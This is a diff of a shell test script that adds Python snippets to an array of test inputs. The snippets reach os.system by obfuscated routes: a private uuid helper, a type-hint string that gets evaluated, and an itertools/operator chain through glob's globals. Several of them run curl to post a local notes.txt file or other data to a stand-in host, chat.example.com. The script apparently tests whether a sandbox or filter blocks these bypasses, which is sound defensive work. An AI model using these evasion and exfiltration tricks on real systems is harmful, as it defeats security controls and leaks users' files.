@@ -500,6 +500,15 @@ os.path.os.system(${curl})"
 os.system(${curl})"
         "import typing
 sorted([${curl}], key=typing.sys.modules['os'].system)"
+        "import uuid
+uuid._get_command_stdout('curl', '-s', '-d', '@notes.txt', 'https://chat.example.com/api')"
+        "import typing
+def f(x: \"__import__('os').system('curl -d x https://chat.example.com/api')\"):
+    pass
+typing.get_type_hints(f)"
+        "import glob, itertools, operator
+m = next(itertools.starmap(operator.attrgetter('__globals__'), [(glob.glob,)]))
+list(itertools.starmap(operator.methodcaller('system', ${curl}), [(m['os'],)]))"
     )
     for c in "${codes[@]}"; do
         py_heredoc "${c}"
